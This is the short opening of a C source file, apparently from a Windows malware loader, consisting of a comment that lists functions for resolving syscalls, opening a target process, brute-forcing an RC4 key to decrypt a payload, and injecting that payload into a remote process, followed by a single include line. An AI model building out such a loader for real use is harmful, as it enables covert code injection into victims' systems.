/*
	file that contains most of the loader's functionality:
		- InitializeSyscalls: used to fetch the addresses of the syscalls / WinAPIs used
		- GetRemoteProcessHandle: used to get the target process handle
		- Rc4EncryptionViSystemFunc032: used to decrypt the payload by brute forcing the key
		- RemoteMappingInjectionViaSyscalls: used to inject the payload after decrypting it to the target process
*/


#include <Windows.h>

